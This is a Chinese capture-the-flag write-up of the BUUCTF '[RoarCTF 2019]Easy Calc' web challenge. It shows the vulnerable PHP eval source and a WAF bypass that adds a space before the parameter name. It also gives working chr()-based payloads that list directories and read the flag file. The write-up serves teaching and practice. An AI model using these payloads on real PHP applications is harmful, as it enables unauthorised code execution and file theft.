---
title: "[RoarCTF 2019]Easy Calc"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [php-eval, waf-bypass, code-execution, chr-bypass]
vulnerability: PHP eval代码执行 + WAF绕过
solved: true
flag: "flag{a4ed9db2-31d8-45b7-aa96-ecebb2cc68a8}"
---

# [RoarCTF 2019]Easy Calc

## 题目概述
一个简单的在线计算器，用户输入数学表达式后返回计算结果。页面注释提示"已设置WAF确保安全"。

## 信息收集
1. 访问首页，发现计算器通过 AJAX 请求 `calc.php?num=` 参数
2. 直接访问 `calc.php` 获取源码：
```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
    $str = $_GET['num'];
    $blacklist = [' ', '\t', '\r', '\n', '\'', '"', '`', '\[', '\]', '$', '\\', '\^'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $str)) {
            die("what are you want to do?");
        }
    }
    eval('echo ' . $str . ';');
}
?>
```

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：PHP eval 代码执行 + WAF 绕过

**原理**：
1. `eval('echo '.$str.';')` 直接将用户输入拼接到代码中执行，存在代码执行漏洞
2. 黑名单过滤了空格、引号、方括号等特殊字符，但可以用 `chr()` 函数绕过
3. 存在额外 WAF（Apache 层面），拦截包含 `num=` 的请求
4. **关键绕过**：PHP 参数解析特性 - 当 URL 参数名前加空格（`%20num`），WAF 无法识别，但 PHP 会将其解析为 `num`

**判断过程**：
- 直接访问 `calc.php?num=1+1` 返回 403 Forbidden，说明有 WAF
- 尝试 `calc.php?%20num=1` 返回正常结果，确认绕过成功

## 利用过程（Payload + Flag）

**步骤1：绕过 WAF 测试代码执行**
```
?%20num=phpinfo()
```
成功返回 phpinfo 页面

**步骤2：列出根目录文件**
```
?%20num=var_dump(scandir(chr(47)))
```
`chr(47)` = `/`，绕过引号限制。发现 `/f1agg` 文件

**步骤3：读取 flag 文件**
```
?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```
`chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)` = `/f1agg`

**Flag**: `flag{a4ed9db2-31d8-45b7-aa96-ecebb2cc68a8}`

## 复现步骤
1. 访问题目，查看源码发现 `calc.php`
2. 访问 `calc.php` 获取 PHP 源码
3. 分析发现 eval 代码执行 + 黑名单过滤 + WAF
4. 使用 `%20num` 绕过 WAF
5. 使用 `chr()` 函数绕过引号限制
6. 构造 payload 读取 `/f1agg` 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| PHP eval 代码执行 | num 参数 | `var_dump(file_get_contents(chr(47).chr(102)...))` | eval危险函数 |
| WAF 绕过 | 参数名前加空格 | `%20num=xxx` | PHP参数解析特性 |
| 黑名单绕过 | chr() 替代引号 | `chr(47)` 代替 `'/'` | chr()函数构造字符串 |

## 知识总结（解题技巧、同类题型套路）

1. **PHP 参数解析特性**：PHP 会将参数名中的某些特殊字符（如空格、点）转换为下划线，或直接忽略前导空格，可用于绕过基于参数名的 WAF
2. **chr() 绕过引号过滤**：当引号被过滤时，可用 `chr()` 函数拼接任意字符串
3. **scandir() 列目录**：代码执行场景下，配合 `scandir()` 和 `file_get_contents()` 实现任意文件读取
4. **多层防护分析**：遇到 WAF 拦截时，需区分应用层过滤（PHP 代码）和网络层过滤（Apache/WAF），针对性绕过
